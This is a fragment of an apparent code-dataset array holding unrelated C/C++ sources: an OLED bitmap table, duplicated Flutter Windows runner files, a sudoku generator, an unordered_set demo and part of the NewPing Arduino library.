0x80, 0x80,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x80, 0x00, 0x00, 0x8C, 0x8E, 0x84, 0x00, 0x00, 0x80, 0xF8,\n0xF8, 0xF8, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xE0, 0xE0, 0xC0, 0x80,\n0x00, 0xE0, 0xFC, 0xFE, 0xFF, 0xFF, 0xFF, 0x7F, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0xFF, 0xC7, 0x01, 0x01,\n0x01, 0x01, 0x83, 0xFF, 0xFF, 0x00, 0x00, 0x7C, 0xFE, 0xC7, 0x01, 0x01, 0x01, 0x01, 0x83, 0xFF,\n0xFF, 0xFF, 0x00, 0x38, 0xFE, 0xC7, 0x83, 0x01, 0x01, 0x01, 0x83, 0xC7, 0xFF, 0xFF, 0x00, 0x00,\n0x01, 0xFF, 0xFF, 0x01, 0x01, 0x00, 0xFF, 0xFF, 0x07, 0x01, 0x01, 0x01, 0x00, 0x00, 0x7F, 0xFF,\n0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x7F, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0xFF,\n0xFF, 0xFF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x03, 0x0F, 0x3F, 0x7F, 0x7F, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xE7, 0xC7, 0xC7, 0x8F,\n0x8F, 0x9F, 0xBF, 0xFF, 0xFF, 0xC3, 0xC0, 0xF0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFC, 0xFC, 0xFC,\n0xFC, 0xFC, 0xFC, 0xFC, 0xFC, 0xF8, 0xF8, 0xF0, 0xF0, 0xE0, 0xC0, 0x00, 0x01, 0x03, 0x03, 0x03,\n0x03, 0x03, 0x01, 0x03, 0x03, 0x00, 0x00, 0x00, 0x00, 0x01, 0x03, 0x03, 0x03, 0x03, 0x01, 0x01,\n0x03, 0x01, 0x00, 0x00, 0x00, 0x01, 0x03, 0x03, 0x03, 0x03, 0x01, 0x01, 0x03, 0x03, 0x00, 0x00,\n0x00, 0x03, 0x03, 0x00, 0x00, 0x00, 0x03, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,\n0x03, 0x03, 0x03, 0x03, 0x03, 0x01, 0x00, 0x00, 0x00, 0x01, 0x03, 0x01, 0x00, 0x00, 0x00, 0x03,\n0x03, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n#if (SSD1306_LCDHEIGHT == 64)\n0x00, 0x00, 0x00, 0x80, 0xC0, 0xE0, 0xF0, 0xF9, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x3F, 0x1F, 0x0F,\n0x87, 0xC7, 0xF7, 0xFF, 0xFF, 0x1F, 0x1F, 0x3D, 0xFC, 0xF8, 0xF8, 0xF8, 0xF8, 0x7C, 0x7D, 0xFF,\n0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x7F, 0x3F, 0x0F, 0x07, 0x00, 0x30, 0x30, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0xFE, 0xFE, 0xFC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE0, 0xC0, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x30, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0xC0, 0xFE, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x7F, 0x7F, 0x3F, 0x1F,\n0x0F, 0x07, 0x1F, 0x7F, 0xFF, 0xFF, 0xF8, 0xF8, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFE, 0xF8, 0xE0,\n0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\n#include <cmath>\n#include <cstdlib>\n#include <ctime>\n#include <vector>\nusing namespace std;\n\nconst int STANDARD_SIZE = 9;\nconst int GIGANT_SIZE = 16;\nconst char VALUES[16] = {'1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F', 'G'};\n\nvoid horizontal(vector<vector<char>>& sudokuTable, const int PUZZLE_SIZE) {\n    //borders could be written without this loops AS WELL :)\n    string horizont = (PUZZLE_SIZE == 16) ? \"====\" : \"===\";\n    if(PUZZLE_SIZE == 16) {//nuthin special, for beauty\n        for(int i = 0; i < PUZZLE_SIZE - 6; i++)\n            cout << horizont;\n        cout << \"==\" << endl;\n    }\n    else {\n        for(int i = 0; i < PUZZLE_SIZE; i++)\n            cout << horizont;\n        cout << endl;\n    }\n}\n\nvoid draw(vector<vector<char>>& sudokuTable, const int PUZZLE_SIZE) {\n\n    const string sides = \"||\";\n    int cntHorizontal = (PUZZLE_SIZE == 16) ? 3 : 2;\n    int cntVertical = (PUZZLE_SIZE == 16) ? 3 : 2;\n    const int grid = cntHorizontal;\n\n    for(int i = 0; i < PUZZLE_SIZE; i++) {\n        if(cntHorizontal == grid) {\n            horizontal(sudokuTable, PUZZLE_SIZE);\n            cntHorizontal = 0;\n        } else {\n            cntHorizontal++;\n        }\n\n        int cntVertical = grid;\n        for(int j = 0; j < PUZZLE_SIZE; j++) {\n            if(cntVertical == grid) {\n                cout << sides;\n                cntVertical = 0;\n            } else cntVertical ++;\n\n            cout << sudokuTable[i][j] << \" \";\n\n            if(j == 8 && grid == 2) cout << sides;\n            if(j == 15 && grid == 3) cout << sides;\n        }\n        cout << endl;\n\n        if(i == 8 && grid == 2) horizontal(sudokuTable, PUZZLE_SIZE);\n        if(i == 15 && grid == 3) horizontal(sudokuTable, PUZZLE_SIZE);\n    }\n}\n\n\nbool isValid(int rowz, int col, int val, vector<vector<char>>& sudokuTable, const int PUZZLE_SIZE) {\n    // Checking val existence on a column/row\n    for(int c =  0; c < PUZZLE_SIZE; c++)  \n        if(sudokuTable[rowz][c] == val) return false;\n\n    for(int r = 0; r < PUZZLE_SIZE; r++)  \n        if(sudokuTable[r][col] == val) return false;\n\n    int grid = 3;\n    if(PUZZLE_SIZE == 16) grid = 4;\n\n    int gridRow = floor(rowz /  grid) *  grid, gridCol = floor(col /  grid) *  grid;\n\n    for(int r = gridRow; r < gridRow +  grid; r++) {\n        for(int c = gridCol; c < gridCol +  grid; c++) {\n            if(sudokuTable[r][c] == val) return false;\n        }\n    }\n\n    return true;\n}\n\nbool startGame(int rowz, int col, vector<vector<char>>& sudokuTable,  const int PUZZLE_SIZE) {\n\n    if(rowz == PUZZLE_SIZE - 1 && col == PUZZLE_SIZE) \n        return true;\n\n    if(col == PUZZLE_SIZE) {\n        col = 0;\n        rowz++;\n    }\n\n    if(sudokuTable[rowz][col] > '0') return startGame(rowz, col + 1, sudokuTable, PUZZLE_SIZE);\n    \n    for(int i = 0; i < PUZZLE_SIZE; i++) {\n        if(isValid(rowz,col, VALUES[i], sudokuTable, PUZZLE_SIZE)) {\n            sudokuTable[rowz][col] = VALUES[i];\n             if(startGame(rowz, col + 1, sudokuTable, PUZZLE_SIZE)) {\n                return true;\n             }\n        }\n\n        sudokuTable[rowz][col] = '0';\n    }\n\n    return false;\n}\n\nint getRandomNumber(int min, int max) {\n    return rand() % (max - min) + min;\n}\n\nint getRandomNumber(const int PUZZLE_SIZE) {\n    return (rand() % PUZZLE_SIZE);\n}\n\nvoid toChar(char *c, int digit ) {\n    switch (digit) {\n        case 10:\n            *c = 'A';\n            break;\n        case 11:\n            *c = 'B';\n            break;\n        case 12:\n            *c = 'C';\n            break;\n        case 13:\n            *c = 'D';\n            break;\n        case 14:\n            *c = 'E';\n            break;\n        case 15:\n            *c = 'F';\n            break;\n        case 16:\n            *c = 'G';\n            break;\n        \n        default:\n            break;\n    }\n}\n\nvoid generatePuzzle(int level, vector<vector<char>>& sudokuTable, const int  PUZZLE_SIZE) {\n    int emptyCell = pow(PUZZLE_SIZE, 2) - level;\n    cout << \"Count empty cell \" << emptyCell << endl; //Extra !!!\n\n    while(emptyCell > 0) {\n        int randomRow, randomColumn, digit;\n        randomRow = getRandomNumber(PUZZLE_SIZE);\n        randomColumn = getRandomNumber(PUZZLE_SIZE);\n        digit = getRandomNumber(PUZZLE_SIZE) + 1;\n\n        char c;\n        if(digit < 10) c = char(digit + 48);\n        else {\n            toChar(&c, digit);\n        }\n\n        if(sudokuTable[randomRow][randomColumn] == '0') {\n            bool valid = false;\n            while(!valid) {\n                if(sudokuTable[randomRow][randomColumn] != '0') {\n                    sudokuTable[randomRow][randomColumn] = '0';\n                    valid = true;\n\n                    // cout << \"Row \" << randomRow << '\\t' << randomColumn << '\\t' << digit << endl;\n                }\n\n                randomRow = getRandomNumber(PUZZLE_SIZE);\n                randomColumn = getRandomNumber(PUZZLE_SIZE);\n                digit = getRandomNumber(PUZZLE_SIZE);\n            }\n\n        }\n        else {",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"progectmanaging\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include<bits/stdc++.h>\nusing namespace std;\n/*\n\n    // Topic-> Unordered Set\n    1. insert()\n    2. find()\n    3. count()\n    4. erase()\n\n    Features of Set\n    -> Sorted Order\n    -> Unique Elements\n|--------------------|-----------------|\n|           Set      |   Unordered Set |\n|         Sorted     |      Unsorted   |\n|           BST      |      Hashing    |\n|Avg. ->  O(logN)    |         O(1)    |\n|Worst ->   O(N)     |         O(N)    |\n|--------------------|-----------------|\n\n*/\nint main()\n{\n  unordered_set<int> s;\n \n  // insert()  \n  s.insert(5); \n  s.insert(3); \n  s.insert(4); \n  s.insert(2); \n  s.insert(1); \n\n  // find()\n  auto x = s.find(4);  // O(logN)\n  cout<< *x<<endl;\n\n  // count()\n  if(s.count(3)){\n    cout<<\"present\\n\";\n  }\n  else{\n    cout<<\"absent\\n\";\n  }\n  // traversing set\n  for(auto x:s){\n    cout<<x<<\" \";\n  }\n  cout<<endl;\n  // erase()\n  s.erase(3); // O(logN)\n  for(auto x:s){\n    cout<<x<<\" \";\n  }\n  cout<<endl;\n  s.erase(x); // O(1)\n  for(auto x:s){\n    cout<<x<<\" \";\n  }\n}",
    "// ---------------------------------------------------------------------------\n// Created by Tim Eckel - eckel.tim@gmail.com\n//\n// See NewPing.h for license, purpose, syntax, version history, links, etc.\n// ---------------------------------------------------------------------------\n\n#include \"NewPing.h\"\n\n\n// ---------------------------------------------------------------------------\n// NewPing constructor\n// ---------------------------------------------------------------------------\n\nNewPing::NewPing(uint8_t trigger_pin, uint8_t echo_pin, unsigned int max_cm_distance) {\n#if DO_BITWISE == true\n\t_triggerBit = digitalPinToBitMask(trigger_pin); // Get the port register bitmask for the trigger pin.\n\t_echoBit = digitalPinToBitMask(echo_pin);       // Get the port register bitmask for the echo pin.\n\n\t_triggerOutput = portOutputRegister(digitalPinToPort(trigger_pin)); // Get the output port register for the trigger pin.\n\t_echoInput = portInputRegister(digitalPinToPort(echo_pin));         // Get the input port register for the echo pin.\n\n\t_triggerMode = (uint8_t *) portModeRegister(digitalPinToPort(trigger_pin)); // Get the port mode register for the trigger pin.\n#else\n\t_triggerPin = trigger_pin;\n\t_echoPin = echo_pin;\n#endif\n\t_one_pin_mode = (trigger_pin == echo_pin); // Automatic one pin mode detection per sensor.\n\n\tset_max_distance(max_cm_distance); // Call function to set the max sensor distance.\n\n#if (defined(__arm__) && (defined(TEENSYDUINO) || defined(PARTICLE))) || defined(ARDUINO_AVR_YUN) || DO_BITWISE != true\n\tpinMode(echo_pin, INPUT);     // Set echo pin to input (on Teensy 3.x (ARM), pins default to disabled, at least one pinMode() is needed for GPIO mode).\n\tpinMode(trigger_pin, OUTPUT); // Set trigger pin to output (on Teensy 3.x (ARM), pins default to disabled, at least one pinMode() is needed for GPIO mode).\n#endif\n\n#if DO_BITWISE == true\n\t*_triggerMode |= _triggerBit;    // Set trigger pin to output.\n\t*_triggerOutput &= ~_triggerBit; // Trigger pin should already be low, but set to low to make sure.\n#else\n\tdigitalWrite(_triggerPin, LOW);  // Trigger pin should already be low, but set to low to make sure.\n#endif\n}\n\n\n// ---------------------------------------------------------------------------\n// Standard ping methods\n// ---------------------------------------------------------------------------\n\nunsigned int NewPing::ping(unsigned int max_cm_distance) {\n\tif (max_cm_distance > 0) set_max_distance(max_cm_distance); // Call function to set a new max sensor distance.\n\n\tif (!ping_trigger()) return NO_ECHO; // Trigger a ping, if it returns false, return NO_ECHO to the calling function.\n\n#if URM37_ENABLED == true\n\t#if DO_BITWISE == true\n\t\twhile (!(*_echoInput & _echoBit)) // Wait for the ping echo.\n\t#else\n\t\twhile (!digitalRead(_echoPin))    // Wait for the ping echo.\n\t#endif\n\t\t\tif (micros() > _max_time) return NO_ECHO; // Stop the loop and return NO_ECHO (false) if we're beyond the set maximum distance.\n#else\n\t#if DO_BITWISE == true\n\t\twhile (*_echoInput & _echoBit)    // Wait for the ping echo.\n\t#else\n\t\twhile (digitalRead(_echoPin))     // Wait for the ping echo.\n\t#endif\n\t\t\tif (micros() > _max_time) return NO_ECHO; // Stop the loop and return NO_ECHO (false) if we're beyond the set maximum distance.\n#endif\n\n\treturn (micros() - (_max_time - _maxEchoTime) - PING_OVERHEAD); // Calculate ping time, include overhead.\n}\n\n\nunsigned long NewPing::ping_cm(unsigned int max_cm_distance) {\n\tunsigned long echoTime = NewPing::ping(max_cm_distance); // Calls the ping method and returns with the ping echo distance in uS.\n#if ROUNDING_ENABLED == false\n\treturn (echoTime / US_ROUNDTRIP_CM);              // Call the ping method and returns the distance in centimeters (no rounding).\n#else\n\treturn NewPingConvert(echoTime, US_ROUNDTRIP_CM); // Convert uS to centimeters.\n#endif\n}\n\n\nunsigned long NewPing::ping_in(unsigned int max_cm_distance) {\n\tunsigned long echoTime = NewPing::ping(max_cm_distance); // Calls the ping method and returns with the ping echo distance in uS.\n#if ROUNDING_ENABLED == false\n\treturn (echoTime / US_ROUNDTRIP_IN);              // Call the ping method and returns the distance in inches (no 